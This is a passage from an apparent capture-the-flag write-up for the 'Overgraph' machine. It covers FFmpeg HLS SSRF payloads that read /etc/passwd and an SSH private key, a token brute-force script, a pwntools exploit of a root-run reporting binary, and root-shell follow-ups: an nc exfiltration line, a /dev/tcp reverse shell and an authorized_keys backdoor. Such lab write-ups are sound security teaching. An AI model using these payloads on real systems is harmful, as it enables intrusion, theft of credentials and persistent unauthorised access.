Still following the hackerone report, to get the next line of the file, I’ll count that the first line had 32 characters in it (including the new line):

```

oxdf@hacky$ echo "root:x:0:0:root:/root:/bin/bash" | wc -c
32

```

Instead of using the `file` protocol, it’s now using the `subfile` [protocol](https://ffmpeg.org/ffmpeg-protocols.html#subfile) to read parts of a file. The number is based at 0 (despite what the hackerone report implies):

```

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.14.6/header.m3u8|subfile,,start,32,end,10000,,:///etc/passwd
#EXT-X-ENDLIST

```

On submitting, it returns the next line:

```
10.10.11.157 - - [28/Jul/2022 09:53:44] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [28/Jul/2022 09:53:44] "GET ?daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin HTTP/1.1" 301 -

```

#### Script Fails

I spent too long trying to write a script that would take a file name, fetch it, and print it correctly to the terminal (or allow for redirecting to a file). I started using Python’s `http.server`, but eventually gave up on that and pivoted to Flask. I made a nice script that worked great until I got a request with spaces in it:

```

oxdf@hacky$ python read.py /etc/passwd
 * Serving Flask app 'read' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
10.10.11.157 - - [28/Jul/2022 11:52:17] code 400, message Bad request syntax ('GET /x?list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin HTTP/1.1')

```

I couldn’t find a nice way to handle that, and eventually moved on.

#### FFmpeg-HLS-SSRF

[This project](https://github.com/0xcoyote/FFmpeg-HLS-SSRF) will download files using some of the same logic I was looking for on my own. I’ll edit `mal.avi` to contain the URL the project wants:

```

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://10.10.14.6/initial.m3u?filename=/etc/passwd
#EXT-X-ENDLIST

```

Now I start the server, and upload the file. It dumps a lot of junk to the screen and eventually crashes:

```

oxdf@hacky$ python /opt/FFmpeg-HLS-SSRF/server.py --port 80 --external-addr 10.10.14.6

2022-07-28 12:23:02,423 INFO ('10.10.11.157', 50632): client connected
2022-07-28 12:23:02,424 WARNING ('10.10.11.157', 50632): request data b'GET /initial.m3u?filename=/etc/passwd HTTP/1.1\r\nUser-Agent: Lavf/56.4.101\r\nAccept: */*\r\nConnection: close\r\nHost: 10.10.14.6\r\nIcy-MetaData: 1\r\n\r\n'                                        2022-07-28 12:23:02,424 INFO ('10.10.11.157', 50632): got request b'/initial.m3u?filename=/etc/passwd'

b'HTTP/1.0 200 OK\r\nContent-Length: 162\r\n\r\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\n\nhttp://10.10.14.6:80/save_data.m3u?filename=/etc/passwd&exploit_id=2956d69c4ec060d6&first_time=true\n\n\n#EXT-X-ENDLIST\n'                                                    
2022-07-28 12:23:02,602 INFO ('10.10.11.157', 50634): client connected
2022-07-28 12:23:02,603 WARNING ('10.10.11.157', 50634): request data b'GET /save_data.m3u?filename=/etc/passwd&exploit_id=2956d69c4ec060d6&first_time=true HTTP/1.1\r\nUser-Agent: Lavf/56.4.101\r\nAccept: */*\r\nConnection: close\r\nHost: 10.10.14.6:80\r\nIcy-MetaData: 1
\r\n\r\n'
...[snip]...
2022-07-28 12:23:27,882 INFO ('10.10.11.157', 50916): got request b'/save_data.m3u?filename=/etc/passwd&exploit_id=2956d69c4ec060d6&offset=1885&num_retry=10&file_data='
2022-07-28 12:23:27,883 ERROR ('10.10.11.157', 50916): exception during processing request, data = b'GET /save_data.m3u?filename=/etc/passwd&exploit_id=2956d69c4ec060d6&offset=1885&num_retry=10&file_data= HTTP/1.1\r\nUser-Agent: Lavf/56.4.101\r\nAccept: */*\r\nConnection: close\r\nHost: 10.10.14.6:80\r\nIcy-MetaData: 1\r\n\r\n'
Traceback (most recent call last):
  File "/opt/FFmpeg-HLS-SSRF/server.py", line 196, in handle_client
    response = self._handlers[requested_file](params, file_data)
  File "/opt/FFmpeg-HLS-SSRF/server.py", line 105, in save_data
    raise RuntimeError('num_retry > 10')
RuntimeError: num_retry > 10

```

But now there’s a file that has `passwd` in it:

```

oxdf@hacky$ cat 2956d69c4ec060d6____etc_passwd 
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinuser:x:1000:1000:user:/home/user:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemongodb:x:113:118::/var/lib/mongodb:/usr/sbin/nologin

```

The newlines are replaced with nulls, which is annoying, but easily fixed:

```

oxdf@hacky$ cat 2956d69c4ec060d6____etc_passwd | tr '\000' '\n'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...[snip]...

```

### SSH

#### Read Key

I managed to leak the username in error messages earlier, and now from the `passwd` file. I’ll try to grab `id_rsa` from `/home/user/.ssh`:

```

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://10.10.14.6/initial.m3u?filename=/home/user/.ssh/id_rsa
#EXT-X-ENDLIST

```

On uploading, it worked:

```

oxdf@hacky$ cat 23fea34250615ed7____home_user__ssh_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC23Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==-----END OPENSSH PRIVATE KEY-----

```

#### Connect

After fixing the nulls to newlines, I can connect as user:

```

oxdf@hacky$ ssh -i ~/keys/overgraph-user user@graph.htb
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
...[snip]...
user@overgraph:~$

```

And grab `user.txt`:

```

user@overgraph:~$ cat user.txt
af0f30a6************************

```

## Shell as root

### Enumeration

#### netstat

There’s not much to find on the file system, but looking at the `netstat`, there’s a lot of local listening ports:

```

user@overgraph:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9851          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4200          0.0.0.0:*               LISTEN      1075/node           
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1076/node           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8084          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45205         0.0.0.0:*               LISTEN      6196/google-chrome  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44023         0.0.0.0:*               LISTEN      6037/google-chrome  
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

A bunch of these are different webservers and other things related to the initial parts of the box.

#### Custom Reporting Service

TCP 9851 is interesting. It doesn’t talk HTTP, but a raw connection with `nc` will interact with it:

```

user@overgraph:~$ nc localhost 9851
Custom Reporting v1

Enter Your Token:

```

No matter what I give it, it says invalid token and exits:

```

user@overgraph:~$ nc localhost 9851
Custom Reporting v1

Enter Your Token: 0xdf
0xdf
Invalid Token

```

To see if I can find what’s running this, I’ll try a `grep` across the entire filesystem, and within a few seconds, it has something:

```

user@overgraph:~$ grep -r "Custom Reporting v1" / 2>/dev/null
Binary file usr/local/bin/Nreport/nreport matches

```

An even simpler way is to look for that port in the process list:

```

user@overgraph:~$ ps auxww | grep 9851
root         949  0.0  0.0   2608   600 ?        Ss   Jul26   0:00 /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr'
root         950  0.0  0.0   2608   596 ?        S    Jul26   0:00 sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
root         951  0.0  0.0   6964  1768 ?        S    Jul26   0:00 socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr
user       10217  0.0  0.0   6432   720 pts/1    S+   14:34   0:00 grep --color=auto 9851

```

It’s an ELF executable being treated as a network service using `socat`.

I’ll pull back a copy using `scp`, as well as the shared libraries it uses, `libc.so.6` and `ld-linux-x86-64.so.2`:

```

oxdf@hacky$ scp -i ~/keys/overgraph-user user@graph.htb:/usr/local/bin/Nreport/libc/libc.so.6 nreport/
libc.so.6                   100%   14MB   4.8MB/s   00:02    
oxdf@hacky$ scp -i ~/keys/overgraph-user user@graph.htb:/lib64/ld-linux-x86-64.so.2 nreport/
ld-linux-x86-64.so.2        100%  187KB 499.3KB/s   00:00    
oxdf@hacky$ scp -i ~/keys/overgraph-user user@graph.htb:/usr/local/bin/Nreport/nreport nreport/
nreport                     100%   25KB 138.8KB/s   00:00

```

### Pass Auth

#### Fix Libraries

Trying to run the downloaded binary will fail:

```

oxdf@hacky$ ./nreport 
-bash: ./nreport: No such file or directory

```

The binary is looking for libraries in paths that don’t exist on my system:

```

oxdf@hacky$ ldd ./nreport
        linux-vdso.so.1 (0x00007ffe2b5da000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3a77465000)
        /usr/local/bin/Nreport/libc/ld-2.25.so => /lib64/ld-linux-x86-64.so.2 (0x00007f3a77672000)

```

`patchelf` (install with `apt install patchelf`) will fix this to point to the copies I downloaded:

```

oxdf@hacky$ patchelf --set-rpath "./libc.so.6" nreport
oxdf@hacky$ patchelf --set-interpreter "./ld-linux-x86-64.so.2" nreport 

```

Now it works:

```

oxdf@hacky$ ./nreport 
Custom Reporting v1

Enter Your Token:

```

#### main

Opening the binary in Ghidra, the `main` function is very simple:

```

void main(void)

{
  int in_int;
  long FS;
  char in_str [3];
  int canary;
  
  canary = *(undefined8 *)(FS + 0x28);
  puts("Custom Reporting v1\n");
  auth();
  printf("\nWelcome %s",userinfo1);
  do {
    puts(
        "\n1.Create New Message\n2.Delete a Message\n3.Edit Messages\n4.Report All Messages\n5.Exit"
        );
    printf("> ");
    __isoc99_scanf(" %1[^\n]",in_str);
    in_int = atoi(in_str);
    switch(in_int) {
    case 1:
      create();
      break;
    case 2:
      delete();
      break;
    case 3:
      edit();
      break;
    case 4:
      report();
      break;
    case 5:
      system(userinfo1 + 0x28);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}

```

Stack canaries are enabled. It calls the `auth()` function, and then prints a welcome message and goes into a loop until option 5 is selected and it exits. It’s interesting that there’s a call to `system` before it exits, but that’s a challenge for later.

For now, the first challenge is to bypass this `auth()` call, which must be where it’s asking for a token.

#### auth

The `auth` function reads in the token using `fgets`, stores it 0x78 bytes into a structure named `userinfo1`, and then verifies the string length of that is 15.

```

void auth(void)

{
  long lVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int i;
  int enc [14];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  enc._0_8_ = 0;
  enc._8_8_ = 0;
  enc._16_8_ = 0;
  enc._24_8_ = 0;
  enc._32_8_ = 0;
  enc._40_8_ = 0;
  enc._48_8_ = 0;
  printf("Enter Your Token: ");
  fgets(userinfo1 + 0x78,0x13,stdin);
  sVar2 = strlen(userinfo1 + 0x78);
  if (sVar2 != 0xf) {
    puts("Invalid Token");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
...[snip]...

```

Then it does a loop from 0xd (13) to 0 XORing ints from a buffer named `secret`:

```

...[snip]...
  for (i = 0xd; -1 < i; i = i + -1) {
    enc[i] = *(uint *)(secret + (long)i * 4) ^ (int)userinfo1[121] ^ (int)userinfo1[122] ^
                  (int)userinfo1[120] ^ (int)userinfo1[129] ^ (int)userinfo1[133];
  }
...[snip]...

```

It only seems to be using bytes 120, 121, 122, 129, and 133 from `userinfo1`, and given that the input was written to `userinfo1[0x78]` which is 120 bytes in, it seems like it’s using characters 0, 1, 2, 9, and 13 from the token. The rest is not used.

Then it checks a bunch of combinations from the resulting array to see if their sums match specified values:

```

...[snip]...
  if (enc[2] + enc[0] + enc[1] != 0x134) {
    puts("Invalid Token");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (enc[9] + enc[7] + enc[8] != 0x145) {
    puts("Invalid Token");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (enc[13] + enc[11] + enc[12] != 0x109) {
    puts("Invalid Token");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
...[snip]...

```

If they all match, it prompts for a name, storing it at the start of `userinfo1`, and populates a bunch of static values into `userinfo1`:

```

...[snip]...
  printf("Enter Name: ");
  __isoc99_scanf(" %39[^\n]",userinfo1);
  userinfo1._140_8_ = 0x7672632f74706f2f;
  userinfo1._148_2_ = 0x2f31;
  userinfo1[150] = 0;
  strcat(userinfo1 + 0x8c,userinfo1);
  userinfo1._40_8_ = 0x614c22206f686365;
  userinfo1._48_8_ = 0x2064657355207473;
  userinfo1._56_8_ = 0x7461642824206e4f;
  userinfo1._64_8_ = 0x2f203e3e20222965;
  userinfo1._72_8_ = 0x2f676f6c2f726176;
  userinfo1._80_8_ = 0x74726f7065726b;
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  userinfo1._40_8_ = 0x614c22206f686365;
  userinfo1._48_8_ = 0x2064657355207473;
  userinfo1._56_8_ = 0x7461642824206e4f;
  userinfo1._64_8_ = 0x2f203e3e20222965;
  userinfo1._72_8_ = 0x2f676f6c2f726176;
  userinfo1._80_8_ = 0x74726f7065726b;
  return;
}

```

I’m not going to worry about those values for now. I can come back later if necessary.

#### secret

The secret buffer is populated statically before running. Jumping to it in Ghidra, I’ll set the type to `int[14]`:

![image-20220728135844554](https://0xdfimages.gitlab.io/img/image-20220728135844554.png)

The secret bytes are:

```

secret = [18, 1, 18, 4, 66, 20, 6, 31, 7, 22, 1, 16, 64, 0]

```

#### Brute Force Token

There will be many inputs that satisfy the token requirement, and only five of the characters actually matter.

I’ll write a quick Python script to try possible combinations until I find one:

```

#!/usr/bin/env python3

import itertools
import string
from functools import reduce

secret = [18, 1, 18, 4, 66, 20, 6, 31, 7, 22, 1, 16, 64, 0]

for chars in itertools.product(string.ascii_letters + string.digits, repeat=5):

    xor_mask = reduce((lambda x,y: x^y), map(ord, chars))
    enc = [x^xor_mask for x in secret]
    if sum(enc[:3]) == 0x134 and sum(enc[7:10]) == 0x145 and sum(enc[11:14]) == 0x109:
        print(f'Found Valid characters: {chars}')
        print('Token: {}{}{}xxxxxx{}xxx{}'.format(*chars))
        break

```

Explaining that a bit further:
- `itertools.product(string.ascii_letters + string.digits, repeat=5)` - This will generate all possible five character combinations of letters and numbers. I could add special characters in as well, but the number of tokens that should work here seems really high, so this should be fine.
- Even though the program re-XORs the five characters every time, because of how XOR works, I can just XOR the five test characters once, and then try that result against each byte in the secret.
- `map(ord, chars)` - `map` applies a function (`ord`) to each item in a list (the current five characters), so this is converting `'abcde'` to `[97, 98, 99, 100, 101]`.
- `reduce((lambda x,y: x^y), map(ord, chars))` - This will take a list and reduce it to one item, using the provided function. In this case, I’m giving it a lambda that takes two items and XORs them together. So this will take `[97, 98, 99, 100, 101]` and calculate `97 ^ 98 ^ 99 ^ 100 ^ 101` to get 97.
- Finally, it checks if the sums all look good, and if so, breaks, returning the first good token.

The result is quite boring:

```

oxdf@hacky$ python3 brute_token.py 
Found Valid characters: ('a', 'a', 'a', 'a', 's')
Token: aaaxxxxxxaxxxs

```

It works:

```

oxdf@hacky$ ./nreport 
Custom Reporting v1

Enter Your Token: aaaxxxxxxaxxxs
Enter Name:

```

On giving a name, it presents the menu I noted in `main`:

```

oxdf@hacky$ ./nreport 
Custom Reporting v1

Enter Your Token: aaaxxxxxxaxxxs
Enter Name: 0xdf

Welcome 0xdf
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
> 

```

#### Number of Tokens

As a slight diversion, I was curious how many tokens might meet the given criterial. I’ll comment out the break, and let it run for a bit. There are \(62^5 = 916,132,832\) possible tokens with just letters and numbers. After 18 minutes, the script finds 8,182,576 working tokens:

```

oxdf@hacky$ time python brute_token.py | grep Token > tokens

real    17m57.613s
user    17m56.045s
sys     0m0.225s
oxdf@hacky$ wc -l tokens 
8182576 tokens

```

That’s 0.9% of possible tokens with letters and numbers that work to get into this application!

### Execution

#### Protections

It’s useful to know what protections are in place going into the analysis. On Overgraph, Full Randomization is enabled as far as ASLR:

```

user@overgraph:~$ cat /proc/sys/kernel/randomize_va_space 
2

```

The binary itself shows canaries, DEP (NX), but no PIE:

```

oxdf@hacky$ checksec nreport/nreport
[*] '/media/sf_CTFs/hackthebox/overgraph-10.10.11.157/nreport/nreport'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'./libc.so.6'

```

I won’t be able to overflow and change return addresses on the stack, and I won’t be able to execute from the stack. The lack of PIE is important, as it means that the code for the program, as well as variables such as the `userinfo1` (and other) structs won’t move in memory.

#### Strategy

I already noticed that option 5 from the menu calls `system` and then exits:

```

...[snip]...
    case 5:
      system(userinfo1 + 0x28);
                    /* WARNING: Subroutine does not return */
      exit(0);
...[snip]...

```

So if I can modify `userinfo1` at offset 0x28 bytes and then exit, my code will run.

I need to find arbitrary write. Given the nature of the challenge, creating a varied number of messages and titles, it’s reasonable to assume that’s going to be a heap exploit.

#### Edit

The first function I’ll look at is 3, to edit a message. In heap challenges, editing a buffer, especially if you can change the size, is a common place to look for vulnerabilities. This function is completely insecure:

```

void edit(void)

{
  long in_FS_OFFSET;
  int message_num;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (Arryindex == 0) {
    puts("No Message Created");
  }
  else {
    printf("Enter number to edit: ");
    __isoc99_scanf("%d[^\n]",&message_num);
    printf("Message Title: ");
    __isoc99_scanf(" %59[^\n]",*(undefined8 *)(message_array + (long)message_num * 8));
    printf("Message: ");
    __isoc99_scanf("%100[^\n]",*(long *)(message_array + (long)message_num * 8) + 0x3c);
    fflush(stdin);
    fflush(stdout);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

The `Arrayindex` variable does need to be non-zero. I don’t know what that is yet, but without looking, just based on the error message, I can assume that gets set when a message is created.

Then I pass a number to edit, which is read into `message_num` as an integer. Then, `scanf` is used to read up to 59 characters or until a newline into the address stored in `message_array + (long)message_num * 8)`. I see what it’s trying to do. If there are some number of possible messages, the addresses of these messages are stored in an array of pointers starting at `message_array`. So if I want to edit the forth message, passing in “3” (zero-indexed) would get the forth pointer from the array, and then save the new message into that buffer.

The problem here is that there is no range checks. `scanf` will read in positive or negative numbers, so I can practically access anything two GB in either direction from `message_array`.

After saving the title, it fetches the address for the heap chunk containing the message, which it assumes is exactly 60 (0x3c) bytes after the buffer with the title, at `message_array + (long)message_num * 8) + 0x3c`.

#### userinfo1 and message\_array

It’ll be helpful to understand what `userinfo1` looks like in memory to better use it in the exploitation.

I’ll start the program, enter the token and a name, and then when it’s hanging waiting for menu input, attach `gdb`:

```

oxdf@hacky$ sudo gdb -q -p $(pidof nreport)
Attaching to process 73900
...[snip]...
gdb-peda$

```

I’ll examine the strings at `userinfo1`:

```

gdb-peda$ x/40s &userinfo1 
0x404180 <userinfo1>:   "0xdf"
0x404185 <userinfo1+5>: ""
0x404186 <userinfo1+6>: ""
...[snip]...
0x4041a2 <userinfo1+34>:        ""
0x4041a3 <userinfo1+35>:        ""
0x4041a4 <userinfo1+36>:        ""
0x4041a5 <userinfo1+37>:        ""
0x4041a6 <userinfo1+38>:        ""
0x4041a7 <userinfo1+39>:        ""
0x4041a8 <userinfo1+40>:        "echo \"Last Used On $(date)\" >> /var/log/kreport"
0x4041d8 <userinfo1+88>:        ""
0x4041d9 <userinfo1+89>:        ""
0x4041da <userinfo1+90>:        ""

```

The first 40 bytes are reserved for the username. Then there’s the command that’s run on exit at `userinfo1 +40`, which is stored at 0x4041a8 (and because of no PIE, it will always be).

Since I know I can write at any multiple of 8 from `message_array`, I’ll check that out:

```

gdb-peda$ x/8xg &message_array 
0x404120 <message_array>:       0x0000000000000000      0x0000000000000000
0x404130 <message_array+16>:    0x0000000000000000      0x0000000000000000
0x404140 <message_array+32>:    0x0000000000000000      0x0000000000000000
0x404150 <message_array+48>:    0x0000000000000000      0x0000000000000000

```

It’s located at 0x404120.

#### Finding Pointer

I have almost all all I need to exploit this. I’ll connect to the socket, and pass the token and set a name. Then I’ll create a message (doesn’t matter what’s in it, just need to pass the `Arrayindex` check), and then I’ll edit such that it reads the address of the command.

There’s a couple ways I could approach this. I could try to find somewhere that already has this address (like when it is called on exit), but it’s typically referenced as `userinfo1+0x28`.

Instead, I’ll just write it into the username buffer. The is read as any up to 39 non-newline bytes:

```

  printf("Enter Name: ");
  __isoc99_scanf(" %39[^\n]",userinfo1);

```

I’ll send “0xdf”, some nulls to end the string and to get to an eight-byte divisible address, and then the address of the command. Then this area of memory will look like:

![image-20220728185011483](https://0xdfimages.gitlab.io/img/image-20220728185011483.png)

Then when I edit I’ll select note 13, which will check for buffer addresses in at 13 x 8 = 0x68 bytes after `message_array`:

![image-20220728185011483](https://0xdfimages.gitlab.io/img/image-20220728185011483-arrows.png)

By putting that pointer in, now it will write the title to 0x4041a8, and the message 60 bytes later at 0x4041e4. This means some data in `userinfo1` will be overwritten with the message, but that’s most likely fine (worth noting in case things crash before I get the chance to exit).

#### Exploit

Putting this all together, I’ll start a Python script using [PwnTools](https://github.com/Gallopsled/pwntools). [This video](https://www.youtube.com/watch?v=CAIWF9HzfAc) goes over the binary and some of the analysis above, and then shows the process for developing the script (if you want to start at the script development, jump to [18:36](https://youtu.be/CAIWF9HzfAc?t=1116)):

The final script is:

```

#!/usr/bin/env python3

from pwn import *

def create(title, msg):
    p.sendline(b"1")
    p.sendline(title.encode())
    p.sendline(msg.encode())

def edit(num, title, msg):
    p.sendline(b"3")
    p.sendline(str(num).encode())
    p.sendline(title.encode())
    p.sendline(msg.encode())

if args["REMOTE"]:
    p = remote("127.0.0.1", 9851)
else:
    p = process("./nreport")

command_addr = 0x4041A8

# send token
p.sendline(b"aaaxxxxxxaxxxs")
# send name
p.sendline(b"0xdf" + b"\x00" * 4 + p64(command_addr))

create("title", "message")
edit(13, "bash\x00", "0xdf")
x = p.recv()
p.sendline(b"5")
p.interactive()

```

### Shell

#### PTY Issues

Running this exploit locally returns a functional shell:

```

oxdf@hacky$ python root.py 
[+] Starting local process './nreport': pid 104479
[*] Switching to interactive mode
$ id
uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),139(libvirt),998(vboxsf)

```

To get this running on Overgraph, I’ll connect over SSH as user with `-L 9851:localhost:9851`, creating a listening port on my VM that will forward traffic to 9851 on Overgraph’s localhost.

I’ll run the exploit, and get what looks like a shell:

```

oxdf@hacky$ python root.py REMOTE
[+] Opening connection to 127.0.0.1 on port 9851: Done
[*] Switching to interactive mode
...[snip]...
root@overgraph:~# $

```

However, when I run a command, there’s no output:

```

root@overgraph:~# id

root@overgraph:~#

```

Trying things like `reset`, or even a full [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) doesn’t fix it.

If I try `ping -c 1 10.10.14.6`, I will detect ICMP packets in `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
09:47:47.806923 IP 10.10.11.157 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
09:47:47.806980 IP 10.10.14.6 > 10.10.11.157: ICMP echo reply, id 2, seq 1, length 64
tcpdump: pcap_loop: The interface went down
2 packets captured
2 packets received by filter
0 packets dropped by kernel

```

So it’s working, just not getting output.

#### SSH

Without seeing anything, there are many approaches I could take, including:
- Run commands and pipe into `nc` to send back to my VM. It works, and looks like:

  ```

  root@overgraph:~# id | nc 10.10.14.6 443

  ```

  ```

  oxdf@hacky$ nc -lnvp 443
  Listening on 0.0.0.0 443
  Connection received on 10.10.11.157 49866
  uid=0(root) gid=0(root) groups=0(root)

  ```
- Get a reverse shell using `bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'`.
- Check for a root SSH key and send it back over `nc` or `curl`.
- Write my own SSH key into `authorized_keys`.

I’ll use this one line to create the `.ssh` directory if it doesn’t exist, add my key to the `authorized_keys` file (appending so as to not overwrite if it does exist), and then make sure the permissions are good for SSH to trust it:

```

root@overgraph:~# $ mkdir -p /root/.ssh/; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys

```

After that, I’m able to SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@graph.htb
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
...[snip]...
root@overgraph:~# 

```